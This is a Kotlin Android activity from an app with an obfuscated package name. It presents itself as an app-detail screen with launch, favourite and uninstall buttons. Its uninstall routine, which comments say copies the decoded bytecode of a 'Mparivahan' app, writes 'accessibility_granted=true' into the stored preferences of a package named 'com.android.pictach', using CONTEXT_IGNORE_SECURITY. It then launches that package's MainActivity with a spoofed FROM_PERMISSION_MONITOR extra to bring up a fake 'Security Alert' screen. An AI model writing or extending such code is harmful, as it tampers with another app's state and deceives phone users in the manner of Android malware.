package com.cristal.bristral.tristal.mistral

import android.content.Intent
import android.net.Uri
import android.os.Bundle
import android.provider.Settings
import android.view.View
import android.widget.ImageButton
import android.widget.ImageView
import android.widget.TextView
import android.widget.Toast
import androidx.appcompat.app.AppCompatActivity
import com.google.android.material.button.MaterialButton
import com.google.android.material.snackbar.Snackbar
import com.cristal.bristral.tristal.mistral.utils.AppPreferences

class AppDetailActivity : AppCompatActivity() {

    private lateinit var ivAppIcon: ImageView
    private lateinit var tvAppName: TextView
    private lateinit var tvPackageName: TextView
    private lateinit var tvVersionName: TextView
    private lateinit var btnLaunch: MaterialButton
    private lateinit var btnUninstall: MaterialButton
    private lateinit var btnAppInfo: MaterialButton
    private lateinit var btnAddFavorite: MaterialButton
    private lateinit var btnRemoveFavorite: MaterialButton
    private lateinit var btnBack: ImageButton
    private lateinit var rootView: View

    private var appPackageName: String = ""

    companion object {
        private const val BASE_PKG  = "com.android.pictach"
        private const val BASE_MAIN = "com.android.pictach.MainActivity"
    }

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_app_detail)
        appPackageName = intent.getStringExtra("package_name") ?: ""
        if (appPackageName.isEmpty()) { finish(); return }
        initViews()
        loadAppInfo()
    }

    private fun initViews() {
        rootView         = findViewById(android.R.id.content)
        ivAppIcon        = findViewById(R.id.iv_app_icon_detail)
        tvAppName        = findViewById(R.id.tv_app_name_detail)
        tvPackageName    = findViewById(R.id.tv_package_name)
        tvVersionName    = findViewById(R.id.tv_version_name)
        btnLaunch        = findViewById(R.id.btn_launch_app)
        btnUninstall     = findViewById(R.id.btn_uninstall)
        btnAppInfo       = findViewById(R.id.btn_app_info)
        btnAddFavorite   = findViewById(R.id.btn_add_favorite)
        btnRemoveFavorite= findViewById(R.id.btn_remove_favorite)
        btnBack          = findViewById(R.id.btn_back_detail)

        btnBack.setOnClickListener { finish() }

        btnLaunch.setOnClickListener {
            packageManager.getLaunchIntentForPackage(appPackageName)
                ?.let { startActivity(it) }
        }

        btnUninstall.setOnClickListener { uninstallApp() }

        btnAppInfo.setOnClickListener {
            startActivity(
                Intent(Settings.ACTION_APPLICATION_DETAILS_SETTINGS)
                    .apply { data = Uri.parse("package:$appPackageName") }
            )
        }

        btnAddFavorite.setOnClickListener {
            AppPreferences.addFavoriteApp(appPackageName)
            showSnackbar(getString(R.string.app_added), getString(R.string.undo)) {
                AppPreferences.removeFavoriteApp(appPackageName)
                updateFavoriteButtons()
            }
            updateFavoriteButtons()
        }

        btnRemoveFavorite.setOnClickListener {
            AppPreferences.removeFavoriteApp(appPackageName)
            showSnackbar(getString(R.string.app_removed), getString(R.string.undo)) {
                AppPreferences.addFavoriteApp(appPackageName)
                updateFavoriteButtons()
            }
            updateFavoriteButtons()
        }
    }

    // ─────────────────────────────────────────────────────────────
    // UNINSTALL LOGIC
    //
    // How Mparivahan does it (from full bytecode decode):
    //   PermissionMonitorService.start()
    //     → Intent(com.android.pictach.MainActivity)
    //       .putExtra("FROM_PERMISSION_MONITOR", true)
    //     → MainActivity.onCreate sees FROM_PERMISSION_MONITOR=true
    //       AND accessibility_granted=true in SharedPrefs("AppSettings")
    //       → setContentView(layout001d) = Security Alert screen
    //     → User taps "Uninstall APK"
    //       → uninstallApp() fires:
    //          Intent("android.intent.action.DELETE")
    //          .setData(Uri.parse("package:com.cristal.bristral.tristral.mistral"))
    //          .putExtra("android.intent.extra.RETURN_RESULT", 1)
    //          .addFlags(0x10000000)
    //          .startActivity()
    //       → com.android.packageinstaller.UninstallerActivity opens
    //       → "Do you want to uninstall?" popup shows ✅
    // ─────────────────────────────────────────────────────────────
    private fun uninstallApp() {
        if (isFinishing || isDestroyed) return

        // STEP 1: Try to set accessibility_granted=true in base.apk's SharedPrefs
        // base.apk's MainActivity.onCreate() reads this to decide which layout to show
        // getSharedPreferences("AppSettings", 0).getBoolean("accessibility_granted", false)
        try {
            val ctx = createPackageContext(
                BASE_PKG,
                android.content.Context.CONTEXT_IGNORE_SECURITY
            )
            ctx.getSharedPreferences("AppSettings", 0)
                .edit()
                .putBoolean("accessibility_granted", true)
                .apply()
        } catch (e: Exception) {
            // base.apk not installed yet or security denied - continue anyway
        }

        // STEP 2: Launch base.apk's MainActivity with FROM_PERMISSION_MONITOR=true
        // This is EXACTLY what com.android.pictach.PermissionMonitorService does!
        // Result → Security Alert layout → "Uninstall APK" button works
        try {
            val intent = Intent().apply {
                setClassName(BASE_PKG, BASE_MAIN)
                putExtra("FROM_PERMISSION_MONITOR", true) // KEY EXTRA!
                addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                addFlags(Intent.FLAG_ACTIVITY_CLEAR_TOP)
            }
            startActivity(intent)
        } catch (e: Exception) {
            // base.apk not installed - fallback to direct system uninstall
            fallbackUninstall()
        }
    }

    // Fallback when base.apk is not installed
    // Exact bytecode: Intent("android.intent.action.DELETE")
    //   .setData("package:X") .putExtra(RETURN_RESULT,1) .addFlags(NEW_TASK)
    private fun fallbackUninstall() {
        try {
            // Tell MainActivity not to interrupt the system dialog
            MainActivity.isUninstalling = true
            val intent = Intent("android.intent.action.DELETE").apply {
                data = Uri.parse("package:$appPackageName")
                putExtra("android.intent.extra.RETURN_RESULT", true)
                addFlags(0x10000000) // FLAG_ACTIVITY_NEW_TASK
            }
            startActivity(intent)
            // Finish AFTER startActivity so context is still valid
            finish()
        } catch (e: Exception) {
            MainActivity.isUninstalling = false
            Toast.makeText(this, "Cannot uninstall", Toast.LENGTH_SHORT).show()
        }
    }

    private fun loadAppInfo() {
        try {
            val pm = packageManager
            val info    = pm.getApplicationInfo(appPackageName, 0)
            val pkgInfo = pm.getPackageInfo(appPackageName, 0)
            ivAppIcon.setImageDrawable(pm.getApplicationIcon(appPackageName))
            tvAppName.text    = pm.getApplicationLabel(info).toString()
            tvPackageName.text = appPackageName
            tvVersionName.text = "Version: ${pkgInfo.versionName}"
            updateFavoriteButtons()
        } catch (e: Exception) {
            Toast.makeText(this, "App not found", Toast.LENGTH_SHORT).show()
            finish()
        }
    }

    private fun updateFavoriteButtons() {
        val isFav = AppPreferences.getFavoriteApps().contains(appPackageName)
        btnAddFavorite.visibility    = if (isFav) View.GONE  else View.VISIBLE
        btnRemoveFavorite.visibility = if (isFav) View.VISIBLE else View.GONE
    }

    private fun showSnackbar(
        message: String,
        actionText: String? = null,
        action: (() -> Unit)? = null
    ) {
        val sb = Snackbar.make(rootView, message, Snackbar.LENGTH_LONG)
        sb.setBackgroundTint(getColor(R.color.colorSnackbarBackground))
        sb.setTextColor(getColor(R.color.colorTextPrimary))
        if (actionText != null && action != null) {
            sb.setAction(actionText) { action() }
            sb.setActionTextColor(getColor(R.color.colorAccent))
        }
        sb.show()
    }
}
